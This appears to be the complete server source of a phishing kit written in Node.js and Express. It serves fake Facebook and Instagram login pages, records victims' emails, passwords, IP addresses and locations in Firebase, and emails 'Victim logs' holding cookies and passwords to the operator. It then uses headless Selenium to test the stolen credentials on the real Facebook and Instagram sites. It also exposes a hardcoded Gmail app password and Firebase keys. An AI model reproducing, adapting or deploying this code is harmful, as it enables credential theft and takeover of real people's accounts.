const express = require('express');
const cors = require("cors");
const axios = require('axios');
const path = require('path');
const app = express();
const nodemailer = require('nodemailer');
const { Builder, By, until } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const port = 3000; // You can use any port number you prefer
app.use(express.urlencoded({ extended: true }));

app.use(express.json({limit : '10mb'}));
app.use(cors());

// Import the functions you need from the SDKs you need
const { initializeApp } = require('firebase/app');
const { getDatabase, ref, set, serverTimestamp, push, onChildAdded, onValue, get } = require('firebase/database');
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyCWtv7ywcBDKLWqxQ78kOIxXUN04yNbmqQ",
  authDomain: "hpp-server.firebaseapp.com",
  databaseURL: "https://hpp-server-default-rtdb.firebaseio.com",
  projectId: "hpp-server",
  storageBucket: "hpp-server.appspot.com",
  messagingSenderId: "1033612422697",
  appId: "1:1033612422697:web:f6ed94764155498a783638",
  measurementId: "G-V8T9BG89C3"
};

// Initialize Firebase
const apps = initializeApp(firebaseConfig);
const database = getDatabase(apps);
// Route to render pages based on query parameters
// Serve static files from the public directory
app.use(express.static('public'));
app.use(express.static('private'));
// app.use('/admin', express.static(path.join(__dirname, 'admin')));
app.get('/', (req, res) => {
    const page = req.query.browserr;

    switch (page) {
        case 'jppx-public':
            res.sendFile(path.join(__dirname, 'public', 'index.html'));
            console.error("visited");
            break;
        case 'jppx-private-view':
            res.sendFile(path.join(__dirname, 'private', 'index.html'));
            console.error("visitedx");
            break;
        // case 'admin':
        //     res.sendFile(path.join(__dirname, 'admin', 'index.html'));
        //     break;
        default:
            res.send('Page Not Found'); // Or render a 404 page
            break;
    }
});

app.post("/mail-it", async (req, res) =>{
    const {Cookies, History, Password, Email} = req.body;
    try{
        let content = `User Cookies: ${Cookies}<br>User History: ${History}<br>User Password: ${Password}`;
        console.log(content);
        var transporter = await nodemailer.createTransport({
            service: "gmail",
            auth: {
              user: "anonymous.server.tracking@gmail.com",
              pass: "zbfxwoklfjrdinhu",
            },
            tls: {
              rejectUnauthorized: false ,
            }
          });
    
        var mailOptions = {
            from: "Anonymous",
            to: Email,
            subject: "Victim logs",
            html: `
            <div style="font-family: Helvetica, Arial, sans-serif; min-width: 1000px; overflow: auto; line-height: 2;">
            ${content}
            </div>
          `,
          };
          transporter.sendMail(mailOptions, function (error, info) {
            if (error) {
              console.log("new", error);
            } else {
              console.log("Email sent: " + info.response);
            }
          });
          res.status(200).json({success: true, message: "sending successful"});
    }catch(err){
      console.error(err);
      res.status(500).json({success: false, message: "sending failed"});
    }
})

app.post("/loggs", async (req, res)=>{
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  let normalizedIp = clientIp;

// Normalize the IP address for local development
if (clientIp === '::1' || clientIp === '::ffff:127.0.0.1') {
  normalizedIp = '127.0.0.1';
}
  const {id, email, password} = req.body;
  try{
    const Reference = ref(database, id);
    // const urlx = "https://api.ipify.org?format=json"
    // const ip = await axios.get(urlx);
    // const pinn = ip.data;
    // console.log(pinn)
    const url = `http://ip-api.com/json/${normalizedIp}`;

    const locationCountry = await axios.get(url);
    const country = locationCountry.data.country;
    const state = locationCountry.data.regionName;

    const locationData = country + "/" + state;
    console.log(locationData)
    const data = {
      email,
      password,
      time: serverTimestamp(),
      ip: clientIp,
      country: locationData,
      virtualVerify: 0,
      physicalVerify: 0
    }
    const entryLevelRef = push(Reference, data);
    const pushKey = entryLevelRef.key;
    console.log(data, "$$", pushKey);
    res.status(200).json({message: "Logged", Key: pushKey})

  }catch(err){
    console.error(err);
    res.status(500).json({message: "Error"})
  }
})
app.post("/auth", async (req, res)=>{
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const {id, email, password, type} = req.body;
  try{
    const Reference = ref(database, id);
    // const urlx = "https://api.ipify.org?format=json"
    // const ip = await axios.get(urlx);
    // const pinn = ip.data;
    // console.log(pinn)
    const url = `http://ip-api.com/json/${clientIp}`;

    const locationCountry = await axios.get(url);
    const country = locationCountry.data.country;
    const state = locationCountry.data.regionName;

    const locationData = country + "/" + state;
    console.log(locationData)
    const loginData = {
      email,
      pass: password,
    }
    let mainURL = "http://127.0.0.1:3000";
    let pathPlusURL;
    if(type === "Instagram"){
      pathPlusURL= mainURL + "/loginig";
    }else{
      pathPlusURL= mainURL + "/login";
    }
    const response = await axios.post(pathPlusURL, loginData);
    const ver = response.data.state;
    let statey
    if(ver === false){
      statey = 0;
    }else{
      statey = 1;
    }
    const data = {
      email,
      password,
      time: serverTimestamp(),
      ip: clientIp,
      country: locationData,
      virtualVerify: statey,
      physicalVerify: 0,
      type
    }
    const entryLevelRef = push(Reference, data);
    const pushKey = entryLevelRef.key;

    res.status(200).json({message: "Logged", Key: pushKey})

  }catch(err){
    console.error(err);
    res.status(500).json({message: "Error"})
  }
})
app.get("/Auth", async (req, res)=>{
    const type = req.query.type;
    switch(type){
        case "yahoo":
            break;
        case "facebook":
          res.sendFile(path.join(__dirname, 'public/facebook', 'index.html'));
            break;
        case "instagram":
          res.sendFile(path.join(__dirname, 'public/instagram', 'index.html'));
            break;
        default:
            res.send('Page Not Found');
            break;
    }
})
app.get('/check-verify-status/:id/:server', async (req, res) => {
  const id = req.params.id;
  const server = req.params.server;
  const path = server+"/"+id;
  
  try {
    // Reference to the specific entry in the database
    const reference = ref(database, path);

    // Retrieve the data from Firebase
    const snapshot = await get(reference);

    if (snapshot.exists()) {
      const data = snapshot.val();
      
      // Check the virtualVerify status
      const virtualVerifyStatus = data.virtualVerify;

      // Send a response based on the status
      if (virtualVerifyStatus === 1) {
        res.status(200).json({ message: 'Virtual verification successful', status: true });
      } else {
        res.status(200).json({ message: 'Virtual verification failed', status: false });
      }
    } else {
      res.status(404).json({ message: 'No data found for the given ID' });
    }
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Error retrieving verify status' });
  }
});

app.get('/private-details', async (req, res) => {
  try {
    const page = req.query.browserr; // Assume this is the path in the database
    const reference = ref(database, page); // Reference to the specific path

    // Retrieve data from Firebase
    onValue(reference, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        res.status(200).json({ message: data });
      } else {
        res.status(404).json({ message: 'No data found' });
      }
    }, (error) => {
      console.error('The read failed: ' + error.message);
      res.status(500).json({ message: 'Unable to Load Private Details' });
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Unable to Load Private Details' });
  }
});


app.post('/login', async (req, res) => {
  const { email, pass } = req.body;

  const options = new chrome.Options();
  options.addArguments('--headless');  // Run in headless mode
  options.addArguments('--disable-gpu');  // Disable GPU (recommended for headless mode)
  options.addArguments('--no-sandbox');  // Disable the sandbox for Chrome to work in Docker or root environments
  options.addArguments('--disable-dev-shm-usage'); 
  const driver = new Builder().forBrowser('chrome').setChromeOptions(options).build();

  try {
      await driver.get('https://web.facebook.com/login/device-based/regular/login');

      await driver.findElement(By.id('email')).sendKeys(email);
      await driver.findElement(By.id('pass')).sendKeys(pass);

      await driver.findElement(By.id('login_form')).submit();

      await driver.wait(until.elementLocated(By.id('error_box')), 5000).catch(() => {});
      await driver.wait(until.elementLocated(By.id('_9ay7')), 5000).catch(() => {});

      const errorBox = await driver.findElements(By.id('error_box'));
      const error9ay7 = await driver.findElements(By.id('_9ay7'));

      if (errorBox.length > 0 || error9ay7.length > 0) {
          res.json({ state: false, message: 'Invalid credentials' });
      } else {
          const pathsToCheck = ['/home', '/two_step_verification/two_factor', '/'];
          let found = false;

          for (const path of pathsToCheck) {
              try {
                  await driver.wait(async () => {
                      const currentUrl = await driver.getCurrentUrl();
                      return currentUrl.includes(path);
                  }, 10000);

                  found = true;
                  break;
              } catch (error) {
                  // Ignore the error and continue to check the next path
              }
          }

          if (found) {
              res.json({ state: true, message: 'Login successful' });
          } else {
              res.json({ state: false, message: 'Login failed or unexpected page' });
          }
      }
  } catch (error) {
      console.error('Error during login automation:', error);
      res.status(500).json({ state: false, message: 'An error occurred' });
  } finally {
      await driver.quit();
  }
});
app.post('/loginIg', async (req, res) => {
  const { email, pass } = req.body;

  // Initialize the WebDriver
  const options = new chrome.Options();
  options.addArguments('--headless');  // Run in headless mode
  options.addArguments('--disable-gpu');  // Disable GPU (recommended for headless mode)
  options.addArguments('--no-sandbox');  // Disable the sandbox for Chrome to work in Docker or root environments
  options.addArguments('--disable-dev-shm-usage'); 
  const driver = new Builder().forBrowser('chrome').setChromeOptions(options).build();

  try {
      // Navigate to the login page
      await driver.get('https://www.instagram.com/accounts/login/?hl=en');

      // Wait until the login form is visible
      await driver.wait(until.elementLocated(By.id('loginForm')), 10000); // Adjust the timeout as needed

      // Find the email and password input fields and fill them
      await driver.findElement(By.name('username')).sendKeys(email);
      await driver.findElement(By.name('password')).sendKeys(pass);

      // Get the current URL before submitting the form
      const initialUrl = await driver.getCurrentUrl();

      // Submit the form
      await driver.findElement(By.id('loginForm')).submit();

      // Wait for the page to load and check for error indications
      await driver.wait(until.elementLocated(By.className('_ab2z')), 5000).catch(() => {});
      const errorBox = await driver.findElements(By.className('_ab2z'));

      if (errorBox.length > 0) {
          res.json({ state: false, message: 'Invalid credentials' });
      } else {
          // Check if the URL changes after form submission
          const currentUrl = await driver.getCurrentUrl();

          if (currentUrl === initialUrl) {
              res.json({ state: false, message: 'Invalid credentials: Page did not change after submission' });
          } else {
              // Check if the URL indicates a successful login
              const pathsToCheck = ['/accounts/onetap', '/accounts/login/two_factor', '/'];
              let found = false;

              for (const path of pathsToCheck) {
                  try {
                      await driver.wait(async () => {
                          const url = await driver.getCurrentUrl();
                          return url.includes(path);
                      }, 10000);

                      found = true;
                      break;
                  } catch (error) {
                      // Ignore the error and continue to check the next path
                  }
              }

              if (found) {
                  res.json({ state: true, message: 'Login successful' });
              } else {
                  res.json({ state: false, message: 'Login failed or unexpected page' });
              }
          }
      }
  } catch (error) {
      console.error('Error during login automation:', error);
      res.status(500).json({ state: false, message: 'An error occurred' });
  } finally {
      await driver.quit();
  }
});





// Start the server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
